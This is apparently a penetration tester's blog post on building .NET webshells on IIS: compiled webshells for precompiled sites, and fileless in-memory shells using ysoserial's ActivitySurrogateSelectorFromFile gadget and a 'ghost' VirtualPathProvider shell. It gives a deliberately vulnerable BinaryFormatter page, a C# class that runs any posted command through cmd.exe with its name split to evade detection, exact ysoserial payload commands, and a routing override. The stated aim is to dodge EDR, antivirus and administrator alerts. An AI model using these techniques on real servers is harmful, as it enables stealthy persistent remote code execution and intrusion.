---
title: .NET Webshell
date: 2023-12-26 08:51:00 +0700
categories: [Others]
tags: []
---

Webshell is basically the most common way to get RCE on the target. But that also means we would create new files on the server. Unfortunately, if server has any EDR or AV installed on it, the webshell we uploaded would be deleted or an alert would be noticed to administrator. That restriction leads to memory webshell concept. It is a kind of webshell that would be saved in memory, therefore it would works althought original file had been deleted. In java application, for example one deployed on Tomcat server, we can inject memory web shell in Listener, Filter, ... layers, so is it any technique similar to that in .NET?

While doing pentest/finding 0-days with .NET target, there are some cases i faced about webshell. Before go to details, you can quickly setup a lab for testing

## Setup
I used a VMWare to create a IIS Webserver run on Windows Server 2016 to deploy a website on it. You have to add the following roles and features

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/4789a892-76d7-4fea-93ec-2cc55bff7675)

Download and install Webdeploy from [here](https://www.microsoft.com/en-us/download/details.aspx?id=43717) on the server, then go to services to make sure that Web Management Service is running

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/15b81b48-3568-47bd-975e-1aa2456f13fe)

Now in your local machine, create a MVC web application in Visual Studio, then go to build -> Publish [You project name], then fill the form like the following

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/bc23a6ff-cada-47e6-9cae-20acb4107044)

Then save and publish, your website would be deploy to /rcelab in case of above example

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/79e5e913-4328-4d36-87ad-46908d7aca2e)

## Precompiled application
Some of the application i faced applies precompiled deployment. To setup, in your Visual Studio solution, change publish setting like the following, check [Precompiled during publishing] option, and in Advanced Settings, uncheck the [allow precompiled site to be updatable], then publish again

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/56fff7e1-35f8-4645-bae2-022faa07cdd5)

Now all the .aspx file on the server would look like this

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/e86dbb51-b6d7-4432-b7f2-c3f11efbf27d)

In this condition, even when we can upload a .aspx webshell to the web directory, it could not be executed as expected.

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/f71bca01-44b9-4880-b4b4-a5e3156b2196)

In this case we have to compile our web shell before upload to webserver. To do that, use aspnet_compiler tools, first create webshell in empty folder 

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/6f4cedc6-30e0-4620-b1d1-5cdbc888723f)

Then open Developer Powershell for VS, execute the following command `aspnet_compiler -p [physical path] -v / [out dir]` 

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/217d629e-49ea-4922-9bb4-775481119b24)

Then [out dir] has the following files

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/4464d548-dff7-48a8-bbc0-df1be05c4fe8)

Then upload folder bin to webserver, we can finally execute our webshell

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/1ced33d3-603a-43e2-947f-c1f72cfd3dad)

To sum up, you have to has to combine path traversal with arbitrary file upload, that makes it harder to get shell.

## Deserialize
In case of deserialize, each time we want to execute different command, we have to re-generate payload using ysoserial, then url encode, send request, etc, ... For better use, sometimes people manipulate deserialization to create web shell, but it leads to problem I already said in the overview above. But we really can get shell without creating files on the server with gadget ActivitySurrogateSelectorFromFile already included in ysoserial. This gadget will create an assembly with our custom C# code, then when deserialize, make the server load that assembly.

First create deserialize.aspx for demonstration, this basically decodes base64 in [string] parameter and deserialize the result.

```csharp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.Serialization.Formatters.Binary" %>

<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    BinaryFormatter binaryFormatter = new BinaryFormatter();
    string base64 = Request["string"];
       if (base64 != null)
            {
                byte[] vs = Convert.FromBase64String(base64);
                MemoryStream stream = new MemoryStream(vs);
                stream.Position = 0;
                binaryFormatter.Deserialize(stream);
            }
}

</script>
```

.NET framework version 4.8+ implements type protections for ActivitySurrogateSelector, so we have to disable it first, send payload generated from the following command via [string] parameter

```bash
ysoserial.exe -f binaryformatter -g ActivitySurrogateDisableTypeCheck -c 123
```

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/fad66618-b37e-48d0-87c4-08227c9b045c)

Create ExploitClass.cs, this class has constructor that get command from [c] parameter then execute it with `cmd /c `

```csharp
// ExploitClass.cs
class E{
    public E()
    {
		//System.Web.HttpContext.Current.Response.StatusCode = System.Convert.ToInt32(System.Web.HttpContext.Current.Request.Cookies["c"].Value);
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
			string dir = context.Server.MapPath("~/") + "/";
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cm"+"d.exe";
            string cmd = context.Request.Form["c"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.WorkingDirectory = dir;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        } catch (System.Exception) {}
        context.Response.Flush();
        context.Response.End();
    }}
```

Then generate payload with ysoserial, it would create assembly for above class, with dependencies on the rest of [-c] option

```bash
ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll"
```

Put payload to [string] param. Now we can execute any command via [c] parameter

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/43e8f6cc-9882-49f5-b58b-73faa89827ad)

This method allows us to load webshell to the memory and helps our webshell avoid security solutions' observation of file changes on the server. But it's not as powerful as memory shell in Java, because we have to carry deserialization payload in each http request. So if deserialization is somehow patched, our shell is gone. We can bypass this restriction by abusing the Virtual Path Provider in .NET. 

## Ghost shell in .NET Virtual Path Provider
Using .NET, it is possible to define virtual paths in order to serve virtual files from storages sources other than the file system. That would help us to create webshell without create any files in target server to avoid detection. That idea is already implemented in Ysoserial here https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs. This technique requires 3 custom elements VirtualPathProvider, VirtualFile and VirtualDirectory. First We create custom VirtualFile to serve our shell.

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/78ad1bc5-60ee-48c1-91ac-07aa01cd695e)

with Exists function always return True, we can access arbitrary filename to get shell, the Open function would be used to return our shell content. For custom VirtualDirectory, we just have to care that whether our virtual path already exists or not

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/6d31d5c4-facc-47f3-a17f-9f2428bec51d)

For custom VirtualPathProvider, some methods have to be override to serve our shell content, one of them is GetFile

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/97d710a6-2f52-45bb-9b08-0662bbd1ed7f)

Since .NET 4.5, web applications can use friendly URLs to not use ".aspx" in the URL when pointing at the ASPX pages. This can stop our method of creating ghost web shells. The following solution was found to overwrite this setting for web applications which used this feature.

```csharp
foreach(var route in System.Web.Routing.RouteTable.Routes)
{
    if (route.GetType().FullName == "Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute") {
        var FriendlySetting = route.GetType().GetProperty("Settings", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public);

        var settings = new Microsoft.AspNet.FriendlyUrls.FriendlyUrlSettings();
        settings.AutoRedirectMode = Microsoft.AspNet.FriendlyUrls.RedirectMode.Off;

        FriendlySetting.SetValue(route, settings);
        }
}
```

This code has already been included in the GhostWebShell.cs file which needs to be uncommented when required. You also have to install https://www.nuget.org/packages/Microsoft.AspNet.FriendlyUrls package that include Microsoft.AspNet.FriendlyUrls.dll. Now the command to generate deserialize payload is

```bash
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll;D:\code\deser\packages\Microsoft.AspNet.FriendlyUrls.Core.1.0.2\lib\net45\Microsoft.AspNet.FriendlyUrls.dll"
```

Then reproduce previous steps to exploit. Then you can access webshell on /fakepath/[anyshellname].aspx

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/d7230584-8e3b-4262-b9d4-ffd0a3bbb7bf)

